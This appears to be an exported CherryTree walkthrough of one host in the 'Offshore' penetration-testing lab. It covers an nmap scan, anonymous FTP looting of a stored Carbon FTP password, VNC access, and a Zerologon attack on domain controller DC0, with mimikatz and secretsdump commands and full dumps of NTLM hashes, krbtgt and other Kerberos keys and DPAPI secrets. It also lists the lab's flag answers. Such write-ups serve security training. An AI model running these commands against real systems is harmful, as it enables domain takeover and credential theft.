<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>JOE-LPTP - 172.16.1.201</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>JOE-LPTP - 172.16.1.201</h1><br/><p><a href="Offshore--JOE-LPTP_-_172.16.1.201_16.html#OFS-Flag17">Flag 17</a></p><p><a href="Offshore--JOE-LPTP_-_172.16.1.201_16.html#OFS-Flag18">Flag 18</a></p><p><a href="Offshore--JOE-LPTP_-_172.16.1.201_16.html#OFS-JOE-LPTPcreds">Credentials for JOE-LPTPT</a></p><p><a href="Offshore--JOE-LPTP_-_172.16.1.201_16.html#OFS-Flag19">Flag 19</a></p><p><a href="Offshore--JOE-LPTP_-_172.16.1.201_16.html#OFS-LABCreds">Credentials for LAB domain admin</a></p><p></p><p>Do an nmap of JOE-LPTP</p><p></p><p><code><span style="background-color:#000000;">└─$ nmap -sV -sC 172.16.1.201       </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 00:53 EDT</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Nmap scan report for 172.16.1.201</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Host is up (0.037s latency).</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Not shown: 993 closed tcp ports (conn-refused)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PORT     STATE SERVICE       VERSION</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">21/tcp   open  tcpwrapped</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| ftp-syst: </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|_  SYST: Windows_NT</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| 05-01-23  08:50PM       &lt;DIR&gt;          .dbus-keyrings</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| 10-11-20  07:01PM       &lt;DIR&gt;          .vscode</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| 10-10-20  10:13PM       &lt;DIR&gt;          3D Objects</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| 10-10-20  10:13PM       &lt;DIR&gt;          Contacts</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| 08-01-22  10:05PM       &lt;DIR&gt;          Desktop</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| 10-18-20  01:57PM       &lt;DIR&gt;          Documents</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| 04-17-21  10:03AM       &lt;DIR&gt;          Downloads</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| 10-10-20  10:13PM       &lt;DIR&gt;          Favorites</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| 10-10-20  10:13PM       &lt;DIR&gt;          Links</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| 10-24-20  10:42AM       &lt;DIR&gt;          Music</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| 10-22-20  05:31AM       &lt;DIR&gt;          OneDrive</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| 10-11-20  06:52PM       &lt;DIR&gt;          Pictures</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| 10-10-20  10:13PM       &lt;DIR&gt;          Saved Games</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| 10-10-20  10:15PM       &lt;DIR&gt;          Searches</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|_10-16-20  05:31PM       &lt;DIR&gt;          Videos</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">80/tcp   open  http          Microsoft IIS httpd 10.0</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|_http-title: IIS Windows</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|_http-server-header: Microsoft-IIS/10.0</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| http-methods: </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|_  Potentially risky methods: TRACE</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">135/tcp  open  msrpc         Microsoft Windows RPC</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">445/tcp  open  microsoft-ds?</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">5800/tcp open  vnc-http      TightVNC (user: joe-lptp; VNC TCP port: 5900)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|_http-title: TightVNC desktop [joe-lptp]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">5900/tcp open  vnc           VNC (protocol 3.8)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| vnc-info: </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|   Protocol version: 3.8</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|   Security types: </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|     VNC Authentication (2)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|     Tight (16)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|   Tight auth subtypes: </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|_    STDV VNCAUTH_ (2)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Host script results:</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| smb2-time: </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|   date: 2023-05-02T04:53:35</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|_  start_date: N/A</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|_nbstat: NetBIOS name: JOE-LPTP, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 005056b9caca (VMware)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">| smb2-security-mode: </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|   311: </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">|_    Message signing enabled but not required</span></code></p><p></p><p>Anonymous FTP is wide open so let&#39;s take a look with FileZilla (but be sure to enable hidden files in Server -&gt; Force showing hidden files)</p><p></p><p><img src="images/16-1.png" alt="images/16-1.png" /></p><p></p><p>There is a flag right in the desktop directory when you open the connection</p><p></p><p><a name="OFS-Flag17"></a><code><span style="background-color:#000000;">OFFSHORE{st0p_us1ng_fr33warez!}</span></code></p><p></p><p>A Carbon FTP shortcut - there is this vulnerability for Carbon FTP - <a href="https://www.exploit-db.com/exploits/47950">Link</a></p><p>This says the user can store their password in C:\Users\&lt;VICTIM&gt;\AppData\Roaming\Neowise\CarbonFTPProjects</p><p>We happen to have access to that via the FTP so let&#39;s check </p><p></p><p><img src="images/16-2.png" alt="images/16-2.png" /></p><p></p><p>Another flag is in that directory</p><p><a name="OFS-Flag18"></a><code><span style="background-color:#000000;">OFFSHORE{An0N_FtP_c@n_rev3al_tr3asUre$}</span></code></p><p></p><p>We also have the CFTP file to do the exploit with</p><p></p><p><img src="images/16-3.png" alt="images/16-3.png" /></p><p></p><p><a name="OFS-JOE-LPTPcreds"></a><code><span style="background-color:#000000;">We have our credentials for joe : Dev0ftheyear!</span></code></p><p></p><p>Earlier we saw the VNC port 5900 was open in our nmap scan, VNC in with these creds now</p><p></p><p>We find a file in C:\Users\joe\Music called clean.ps1 - open it up and it has stop process 7zFM</p><p>Let&#39;s open 7zip and see what we find</p><p></p><p><img src="images/16-4.png" alt="images/16-4.png" /></p><p></p><p>This physical drive is odd, let&#39;s check it out</p><p></p><p>Going through the Phsyical Drives we find another flag</p><p></p><p><img src="images/16-5.png" alt="images/16-5.png" /></p><p></p><p><a name="OFS-Flag19"></a><code><span style="background-color:#000000;">OFFSHORE{b1ts_pl3ase_yall!}</span></code></p><p></p><p>Checking the other folders in the FTP we find a CherryTree file</p><p></p><p><img src="images/16-6.png" alt="images/16-6.png" /></p><p></p><p>Open the CTB file in CherryTree</p><p></p><p><img src="images/16-7.png" alt="images/16-7.png" /></p><p></p><p>It seems DC0 might be vulnerable to zero logon.  Let&#39;s try it.  Metasploit has a module..</p><p></p><p><img src="images/16-8.png" alt="images/16-8.png" /></p><p></p><p><img src="images/16-9.png" alt="images/16-9.png" /></p><p></p><p><a name="OFS-LABCreds"></a><code><span style="background-color:#000000;">[*] Service RemoteRegistry is in stopped state</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Starting service RemoteRegistry</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Target system bootKey: 0x6ec0b591c3e5101ddeb9ea51d51f2943</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Administrator:500:aad3b435b51404eeaad3b435b51404ee:797952ec54e1c3cbecafa37ff2f1bae5:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn&#39;t have hash information.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Dumping cached domain logon information (domain/username:hash)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Dumping LSA Secrets</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] $MACHINE.ACC </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">LAB\DC0$:aes256-cts-hmac-sha1-96:d4e013e7ce31e082caef2c27ab3b20115c88cb06f55982e699a307356ea3f86e</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">LAB\DC0$:aes128-cts-hmac-sha1-96:8f524f15aab8d8fbde3f99f1be5f3e0d</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">LAB\DC0$:des-cbc-md5:6837d9684c8367ec</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">LAB\DC0$:aad3b435b51404eeaad3b435b51404ee:a07bf244bd5d9b1816657afa9e76a4c8:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] DPAPI_SYSTEM </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">dpapi_machinekey:0x836190a58db353b803aaba63897fe7424ba403fa</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">dpapi_userkey:0x04505586f313bd7ee23600b64415690268e2e880</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] NL$KM </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"> 0000   B5 46 41 75 ED 53 90 AB  CB 0A 4B AE 6E 79 AB DA   .FAu.S....K.ny..</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"> 0010   25 DE 44 2B 22 1F 0A 7B  DC 5E F7 0B FA 66 A8 9B   %.D+&quot;..{.^...f..</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"> 0020   CB 37 DE 4E FE 28 D8 DF  1E 99 28 71 CE 87 95 C7   .7.N.(....(q....</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"> 0030   41 27 1F C5 17 55 A0 46  12 5E 36 F1 99 3E 8B DD   A&#39;...U.F.^6..&gt;..</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">NL$KM:b5464175ed5390abcb0a4bae6e79abda25de442b221f0a7bdc5ef70bfa66a89bcb37de4efe28d8df1e992871ce8795c741271fc51755a046125e36f1993e8bdd</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f6aaf1438d78c89c4636179e3ae18ea:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:30ac45b0c7b323178bca5ef51bd2216e:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">joe:1103:aad3b435b51404eeaad3b435b51404ee:4568151a41ac1b353f40f4dc7f90f19d:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">joe_adm:1104:aad3b435b51404eeaad3b435b51404ee:027bd5f86a054db22021a73c06fbd8ea:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">DC0$:1000:aad3b435b51404eeaad3b435b51404ee:a07bf244bd5d9b1816657afa9e76a4c8:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">JOE-LPTP$:1601:aad3b435b51404eeaad3b435b51404ee:7e6845ba911013cc920b9925324f93ea:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SRV01$:1602:aad3b435b51404eeaad3b435b51404ee:3a5aaa10c5c5a6f92827d6b045e776da:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Kerberos keys grabbed</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Administrator:aes256-cts-hmac-sha1-96:575c40111e33699575dd2e9b96e8fd7092ec8b894e796e7fbd86119d5f9dd215</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Administrator:aes128-cts-hmac-sha1-96:d2d8c940a641020e4d4294afbf137e36</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Administrator:des-cbc-md5:d331fd4573efeff2</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">krbtgt:aes256-cts-hmac-sha1-96:7bdeef07937a2a2cdb6dfc4796493e58da35fda184ba8191857c1fdce64ef7f3</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">krbtgt:aes128-cts-hmac-sha1-96:ec30c953a344851ee128167bec7e134a</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">krbtgt:des-cbc-md5:ea5ecb1504989bf1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">joe:aes256-cts-hmac-sha1-96:c4408c4769a1780570f2a2e9f6d69c066cfba8584f9e1d8d87316fd75c1a5afe</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">joe:aes128-cts-hmac-sha1-96:26cbcd8dd951ba95c8ff1cd20a7f98a6</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">joe:des-cbc-md5:ba0e45195258f72f</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">joe_adm:aes256-cts-hmac-sha1-96:9f91c98be2a9b06866b5e84096fc2e64bdbc8809991423c5a7023d19355f0c57</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">joe_adm:aes128-cts-hmac-sha1-96:c894c6e3d6918f17e65dc1700bedfa65</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">joe_adm:des-cbc-md5:67ab37a76b0ea126</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">DC0$:aes256-cts-hmac-sha1-96:d4e013e7ce31e082caef2c27ab3b20115c88cb06f55982e699a307356ea3f86e</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">DC0$:aes128-cts-hmac-sha1-96:8f524f15aab8d8fbde3f99f1be5f3e0d</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">DC0$:des-cbc-md5:6837d9684c8367ec</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">JOE-LPTP$:aes256-cts-hmac-sha1-96:b09f59b3f8303d2f921160f92e8e5d18c374e54540c0492c4c877407ae0aee9b</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">JOE-LPTP$:aes128-cts-hmac-sha1-96:45cbf01d384c24770776b026817d7782</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">JOE-LPTP$:des-cbc-md5:80838c9e8567153e</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SRV01$:aes256-cts-hmac-sha1-96:3ad5249cfe0f8bfb9c287835dfc2f81fc62a9af171b4ca285105a4f77ce469e0</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SRV01$:aes128-cts-hmac-sha1-96:98a627dcb2b9680ed0f54ffac1a2a6a5</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SRV01$:des-cbc-md5:c46419c467451007</span></code></p><p></p><p></p><p>If the above exploit doesn&#39;t work, you can execute it with mimikatz from DC01.</p><p>Make sure Defender is off, psexec -s -i cmd so you are nt authority\system, and here is the mimikatz command.</p><p><code><span style="background-color:#000000;">privilege::debug</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">lsadump::zerologon /account:srv01$ /target:dc0.lab.offshore.local /exploit /null /ntlm</span></code></p><p></p><p><code><span style="background-color:#000000;">└─$ python secretsdump.py -just-dc -no-pass SRV01\$@172.16.1.200</span></code></p><p></p><p><img src="images/16-10.png" alt="images/16-10.png" /></p></div>
</body>
</html>
